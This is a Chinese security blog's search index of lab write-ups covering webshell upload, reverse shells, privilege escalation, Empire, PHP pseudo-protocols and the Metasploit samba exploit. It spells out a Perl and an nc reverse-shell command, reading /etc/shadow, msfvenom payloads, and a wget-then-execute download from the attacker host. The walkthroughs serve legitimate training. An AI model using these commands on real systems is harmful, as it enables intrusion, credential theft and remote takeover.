<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>入侵提权内网渗透(完整版)</title>
      <link href="/2019/04/28/%E5%85%A5%E4%BE%B5%E6%8F%90%E6%9D%83%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>/2019/04/28/%E5%85%A5%E4%BE%B5%E6%8F%90%E6%9D%83%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="入侵提权内网渗透-完整版"><a href="#入侵提权内网渗透-完整版" class="headerlink" title="入侵提权内网渗透(完整版)"></a>入侵提权内网渗透(完整版)</h1><p>​              #<u>注：这次靶机测试，我搞了两天，被靶机秀成了麻瓜，接下来我带领大家领略入侵的快感，当然，你们会看的头皮发麻  哈哈</u></p><p>​         <strong>亲爱的老师给了我们一个ip  192.168.0.178     提示：上传的文件会在5分钟内自动删除，上传的文件名会被md5加密并随机加上1—100内的md5  重命名，当然，看源码也看的出来</strong></p><p><img src="http://kan.027cgb.com/613977/内网渗透/1.png"></p><ul><li>老规矩，先扫描一下网站*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/2.png"></p><ul><li>先登录robots.txt*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/3.png"></p><ul><li></li><li></li><li>我们登录试试这个提示网点*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/4.png"></p><ul><li>是一个上传页面，我们上传一个马上去，  因为我的马是php  所以我在代码前面加一个图片格式的代码*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/5.png"></p><ul><li>就先不上传了   先写一个python的脚本    好方便等会爆破目录*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/6.png"></p><ul><li>把脚本跑出的内容放在txt里面这些就不讲了  先上传木马*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/7.png"></p><ul><li></li><li></li><li></li><li>出现了  旁边的字母  就说明已经上传成功了，抓紧时间  只有半个小时  抓包显示文件上传到   uploads/?   目录    那我们就随便在/后面输入一个文件，然后抓包爆破*</li></ul><p><img src="http://kan.027cgb.com/613977/内网渗透/8.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/9.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/10.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/11.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/12.png"></p><p><em>爆破出来后直接去浏览器（不想开车）  nc –e<br>/bin/sh 192.168.0.126 4433</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/13.png"></p><p>​      <em>用反弹来拿shell，老规矩啊      nc –lvp 4433</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/14.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/16.png"></p><p>​     </p><p>​             <em>现在就是已经连上来了  我们先提个权，避免5分钟后断掉连接      Python –c ‘import pty;pty.spawn(“/bin/sh”)’</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/17.png"></p><p>​     </p><p>​        *使用了这个命令后 就稍微提了权   上面图片有过程    </p><p>使用 find / -user root -perm -4000 -print 2&gt;/dev/null   find / -perm -u=s-type f 2&gt;/dev/null   其中一个 命令   查看可执行文件</p><p><img src="http://kan.027cgb.com/613977/内网渗透/50.png"></p><p>tail  可以查看这些文件，用法可参考百度  搜索linux tail用法使用   Tail –n100 /etc/shadow  </p><p>来查看 用户密码    </p><p><img src="http://kan.027cgb.com/613977/内网渗透/18.png"></p><p>​    </p><p>​        <em>已经爆出来了root密码  但是它被加密了  我们复制这串密文，用kail自带的解密去破解</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/19.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/20.png"></p><p>​       <em>解密后<br>​                  发现密码是  jojn  我们直接  su root 登录</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/21.png"></p><p>​    </p><p>   <em>哈哈<br>​             我们现在是root权限<br>​            真鸡儿猛,但并没有什么用  我们到处看看，发现了有个wp-config.php<br>​            文件  一般都是配置文件 查看内容发现 是连接数据库的配置文件。账户密码皆为wordpress 。。emm好像           也用不上，数据库连接需要内网</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/22.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/23.png"></p><p>​          <em>我们使用msf生成监听 获得内网的ip地址</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/24.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/25.png"></p><p>​       <em>然后利用刚刚拿到的shell  扫描他的路由</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/26.png"></p><p>​         <em>进入扫描内网模块</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/27.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/28.png"></p><p>​         发现有一个ip 开着3306 端口 数据库的端口 数据库连接：mysql -u wordpress -pwordpress -h x.x.x.x 查数据库-&gt;show databases；使用数据库：use wordpress； 查看表：-&gt; show tables ; 查数据;-&gt; select * from XXXXX 获得账户密码， 密码解密</p><p><img src="http://kan.027cgb.com/613977/内网渗透/29.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/30.png"></p><p><img src="http://kan.027cgb.com/613977/内网渗透/31.png"></p><p><em>ssh连接   ssh 账户名@ip</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/32.png"></p><p><em>docker ps 查看进程  进入 容器 docker attach id</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/33.png"></p><p><em>root@252fa8cb1646:/# root -i -t ubuntu /bin/bash   ls 进入root/root ls cat flag   得到    flag</em></p><p><img src="http://kan.027cgb.com/613977/内网渗透/34.png"></p><h1 id="这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。"><a href="#这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。" class="headerlink" title="#   这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。"></a><u>#   这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。</u></h1>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>对网站后台的一次大马攻击并反弹提权</title>
      <link href="/2019/04/22/%E5%AF%B9%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%80%E6%AC%A1%E5%A4%A7%E9%A9%AC%E6%94%BB%E5%87%BB%E5%B9%B6%E5%8F%8D%E5%BC%B9%E6%8F%90%E6%9D%83/"/>
      <url>/2019/04/22/%E5%AF%B9%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%80%E6%AC%A1%E5%A4%A7%E9%A9%AC%E6%94%BB%E5%87%BB%E5%B9%B6%E5%8F%8D%E5%BC%B9%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="对网站后台的一次大马攻击并反弹提权"><a href="#对网站后台的一次大马攻击并反弹提权" class="headerlink" title="对网站后台的一次大马攻击并反弹提权"></a>对网站后台的一次大马攻击并反弹提权</h1><p><strong>前言：</strong>   <em>经常使用一句话木马，总感觉没有什么存在感，今天第一次使用大马，很是有点激动的</em></p><p><u>所需工具： 测试网站，是老师帮我们搭建的，小伙伴们千万不要用别人的网站做实验哦大马，大马是在<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>上找到的，大家要仔细分析，千万不要被黑吃黑</u></p><ol><li><p><em>实验开始，老师给了一段ip  192.168.0.127拿到ip  我先用nmap扫描看看</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/1.png"></p></li></ol><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/2.png"></p><ol start="2"><li><p><em>它告诉我们 博客正在搭建  既然有的话  那我就得扫一下它的目录了</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/3.png"></p><ol start="3"><li><em>不得了 .git源码泄露了   还爆出了admin.php等目录，我们先把他源码爆出了，使用 GitHack  嗯，你们可以去<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>下载它   开始爆了</em></li></ol></li></ol><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/4.png"></p><p>爆出来了我们去看一看</p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/5.png"></p><ol start="4"><li><p><em>直接就出来了账号密码  我们去访问 admin.php  使用这个账号密码  看能不能登录</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/6.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/7.png"></p><ol start="5"><li><p><em>现在上传大马，看看能不能连接</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/8.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/9.png"></p></li></ol></li></ol><ol start="6"><li><p>*现在我们开始反弹提权  木马shell打命令</p><p>perl -e’use Socket;$i=”192.168.0.135”;$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p><p>kail 命令打 nc –lvp 1235*</p></li></ol><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/10.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/11.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/12.png"></p><p>我们cd ..  看看根目录</p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/13.png"></p><ol start="7"><li><p><em>Home 是储存账户信息的 我们进去看看</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/14.png"></p></li><li><p><em>我们用exp打这个文件   开一个kali界面   使用命令：msfvenom -p<br>  cmd/unix/reverse_bash LHOST=192.168.0.153 LPORT=1143</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/15.png"></p></li><li><p><em>现在我们把它加到.sh文件中  ，这里我们就用kail的shell加</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/16.png"></p></li><li><p><em>然后我们kail用msf进入监听模块，去监听他   监听exp =  exploit/multi/handler  Payload是我们生成时候用的payload</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/17.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/18.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/19.png"></p></li></ol><p><del>一次提权就结束了 实际操作还是需要多多练习呢</del></p><p>#注：  <strong>生活就是冲着未来，不要总沉浸在悲伤里</strong></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>域渗透神器Empire的一次简单渗透</title>
      <link href="/2019/04/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8Empire%E7%9A%84%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F/"/>
      <url>/2019/04/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8Empire%E7%9A%84%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="域渗透神器Empire的一次简单渗透"><a href="#域渗透神器Empire的一次简单渗透" class="headerlink" title="域渗透神器Empire的一次简单渗透"></a><strong>域渗透神器Empire的一次简单渗透</strong></h1><p>​          <strong>需要工具:win7系统    kail系统</strong></p><p>​     前言：在日常的学习中，总是会把学过的知识遗忘，那我们就把它写成博客，供自己与他们一起学习</p><ol><li>​      <u>Empire的安装:</u></li></ol><pre><code>Git clone https://github.com/EmpireProject/Empire.gitCd Empire/Cd setup/./install.sh</code></pre><ol start="2"><li><pre><code> 现在就是第一步，打开Empire 首先 cd Empire/ 接着 cd setup/ 最后  ./reset.sh  就能打开了 下面是我的演示图片</code></pre></li></ol><p><img src="http://kan.027cgb.com/613977/1.png"></p><ol start="3"><li><u>可以看到，有285个模块，0个监听，还有0个代理,输入listeners  进入监听</u></li></ol><p><img src="http://kan.027cgb.com/613977/2.png"></p><ol start="4"><li><u>用 info查看需要设置的选项，设置后使用execute运行</u></li></ol><p><img src="http://kan.027cgb.com/613977/3.png"></p><p><img src="http://kan.027cgb.com/613977/4.png"></p><ol start="5"><li><u>生成载荷 mian命令返回主菜单设置listener，然后执行execute生成dll木马,存在/tmp/launcher.dll中</u></li></ol><p><img src="http://kan.027cgb.com/613977/5.png"></p><p><img src="http://kan.027cgb.com/613977/6.png"></p><ol start="6"><li><u>Win7 打开cmd  运行这串代码而那个cmd一闪而过。这就相当于得到一个MSF会话了 选择Jdrops进入会话,进入终端输入help查看可以使用的命令</u></li></ol><p><img src="http://kan.027cgb.com/613977/7.png"></p><ol start="7"><li><u> 我们来通过shell 截被攻击机屏幕的截图</u></li></ol><p><img src="http://kan.027cgb.com/613977/8.png"></p><p><img src="http://kan.027cgb.com/613977/9.png"></p><p><strong>本次实验就到此为止，希望同学们早日成才</strong></p><p>#<u>注</u>：<strong><em>珍惜一个人的生活</em></strong></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>伪协议</title>
      <link href="/2019/01/17/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87%E4%B9%8B%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2019/01/17/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87%E4%B9%8B%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="代码审计之伪协议"><a href="#代码审计之伪协议" class="headerlink" title="代码审计之伪协议"></a><strong>代码审计之伪协议</strong></h1><p><em>有四种常见伪协议：</em></p><ol><li>file://协议 </li><li>php://filter协议 </li><li>php://input协议 </li><li>data://协议</li></ol><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议 :"></a>file://协议 :</h3><p><em>用于访问本地系统文件</em></p><p><a href=""><img src="http://img.027cgb.com/613977/代码审计伪协议/1.png"></a></p><p><em>首先创建一个可控的php文件</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/2.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/2.png"></a></p><p><em>然后再生成一个1.txt的文档</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/2.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/3.png"></a></p><p><em>然后打开phpstudy  进入浏览器进入到file.php里并输入以下内容便可以达到目的</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/4.png"></a></p><h3 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议:"></a>php://filter协议:</h3><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/5.png"></a></p><p><em>直接在浏览器加上以下内容</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/6.png"></a></p><h3 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php://input协议:"></a>php://input协议:</h3><p><em>可以访问原始数据的只读流</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/7.png"></a></p><p><em>输入以下内容便能执行代码执行的功能</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/8.png"></a></p><p><em>同理，我们也可以写入一个文件  代码如下：</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/9.png"></a></p><p><em>同理，我们是不是可以写入一句话木马，然后用菜刀连接</em></p><h3 id="data-协议："><a href="#data-协议：" class="headerlink" title="data://协议："></a>data://协议：</h3><p><em>数据</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/10.png"></a></p><p><em>执行代码如下：</em></p><p><img src="http://img.027cgb.com/613977/代码审计伪协议/11.png"></p><p><em>如果想执行bs64的话就在后面加上bs64就好了</em></p><p><a href="http://img.027cgb.com/613977/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" target="_blank" rel="noopener"><img src="http://img.027cgb.com/613977/代码审计伪协议/12.png"></a></p><p>  注：一步一步的成长</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>渗透Met2</title>
      <link href="/2019/01/17/%E6%B8%97%E9%80%8FMet2/"/>
      <url>/2019/01/17/%E6%B8%97%E9%80%8FMet2/</url>
      
        <content type="html"><![CDATA[<h1 id="假设目标机为Metasploitable2-对Linux机器进行渗透攻击-拿到shell并上传木马"><a href="#假设目标机为Metasploitable2-对Linux机器进行渗透攻击-拿到shell并上传木马" class="headerlink" title="假设目标机为Metasploitable2,对Linux机器进行渗透攻击,拿到shell并上传木马"></a>假设目标机为Metasploitable2,对Linux机器进行渗透攻击,拿到shell并上传木马</h1><p>​           <strong>前言：</strong> <em>每个操作系统都会存在各种Bug,像Windows这样有版权的操作系统，微软公司会快速地开发针对这些Bug或漏洞的补丁，并为用户提供更新。全世界有大量的漏洞研究人员会夜以继日地发现、研究新的Bug,这些没有公布补丁的Bug就是所谓的0day漏洞，由于这种漏洞对网络安全具有巨大威胁，因此0day漏洞页成为黑客的最爱。实际上能掌握0day的黑客少之又少。</em></p><ol><li>首先，先进入msf框架内，在命令行输入：msfconsole   便可以进入msf内</li></ol><p><img src="http://tu.027cgb.com/613977/共计/1-jpg.png"></p><ol start="2"><li><p>首先第一步用nmap扫描目标主机的Ip   </p><p><em>使用命令：nmap –sV 192.168.127.136</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/2-jpg.png"></p><ol start="3"><li><p>在扫描结果中出现了Samba smbd 3.x-4.x 的服务，我们可以用search XXX  去查看可用的exploit   </p><p>  <em>使用命令： search samba</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/3-jpg.png"></p><p>   当看到excellent  说明是比较新，可以使用的</p><p>   <img src="http://tu.027cgb.com/613977/共计/4.png"></p><p>   那我们便使用这个exploit  </p><p>   命令语句：use exploit/multi/samba/usermap_script*</p><p>   <img src="http://tu.027cgb.com/613977/共计/5.png"></p><ol start="4"><li><p>当我们进入后先看看他需要的设置和可用的payload</p><p>   命令： show options*</p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/6.png"></p><p>​        命令：show payloads*</p><p><img src="http://tu.027cgb.com/613977/共计/7.png"></p><ol start="5"><li><p>此时我们选择 的payload 是  cmd/unix/reverse  </p><p><em>使用命令：set payload cmd/unix/reverse</em></p><p><img src="http://tu.027cgb.com/613977/共计/8.png"></p></li></ol><p>​      现在开始绑定我们的数据  首先先确定被攻击主机的IP</p><p>​      命令是：set rhosts 192.168.127.136*</p><p><img src="http://tu.027cgb.com/613977/共计/9.png"></p><p>​      绑定端口   命令： set RPORT 139     这个端口必须得和发现漏洞德端口一致</p><p>​      绑定攻击主机的Ip   </p><p>​      命令：set lHOST 192.168.127.138*</p><p><img src="http://tu.027cgb.com/613977/共计/10.png"></p><ol start="6"><li><p>然后就是直接连接被攻击机</p><p><em>命令： run</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/11.png"></p><ol start="7"><li><p>这里我们已经连上被攻击机了 我们来查看一下我们是什么用户</p><p><em>命令：Whomai</em></p><p><img src="http://tu.027cgb.com/613977/共计/12.png"></p></li><li><p>经拿到被攻击机的shell了，但是并不满足如痴，想上传一个木马病毒，说干就干新开一个命令行窗口，新建一个病毒</p><p><em>命令：msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻 击机IP LPORT=攻击机端口 -f elf -o payload.elf</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/13.png"></p><p>​         已经好了  我们ls看一下</p><p><img src="http://tu.027cgb.com/613977/共计/14.png"></p><ol start="9"><li><p>现在我们开启ftp服务，用控制的shell去下载我们的病毒</p><p><em>命令： python -m SimpleHTTPServer 8000</em></p></li></ol><p>   <img src="http://tu.027cgb.com/613977/共计/15.png"></p><ol start="10"><li><p>现在开始控制被攻击主机的shell去下载</p><p><em>命令： wget &lt;<a href="http://192.168.127.138:8000/payload.elf" target="_blank" rel="noopener">http://192.168.127.138:8000/payload.elf</a></em></p><p><em>&gt;</em></p><p><img src="http://tu.027cgb.com/613977/共计/16.png"></p></li></ol><p>​     已经下载成功了   我们ls查看下</p><p><img src="http://tu.027cgb.com/613977/共计/17.png"></p><ol start="11"><li><p>已经有了 现在我们帮这个文件添加可执行权</p><p>命令  chmod +x payload.elf</p><p>然后执行</p><p>命令：  ./payload.elf</p></li></ol><pre><code>&lt;img src=&quot;http://tu.027cgb.com/613977/共计/18.png&quot; /&gt;</code></pre><p>​       当然，此时是没有任何反应   现在我们进入exploit/multi/handler模块</p><p>​        <img src="http://tu.027cgb.com/613977/共计/19.png"></p><p>​      然后进入  linux/x86/meterpreter/reverse_tcp   模块</p><p><img src="http://tu.027cgb.com/613977/共计/20.png"></p><p>​      Show options一下</p><p><img src="http://tu.027cgb.com/613977/共计/21.png"></p><ol start="12"><li>绑定攻击主机ip，然后运行挂起，在shell那边运行那个程序，然后sessions  一下</li></ol><p><img src="http://tu1.027cgb.com/613977/共计/22.png"></p><ol start="13"><li>然后选择 sessions 1  就可以进入shell了</li></ol><p><img src="http://tu1.027cgb.com/613977/共计/23.png"></p><p>​       #注: <strong>好了，是不是很简单呀，不过要多尝试哦， 对其他系统也是可以的，只是命令不同</strong>-_—</p>]]></content>
      
      
      
    </entry>
    
  
  
</search>
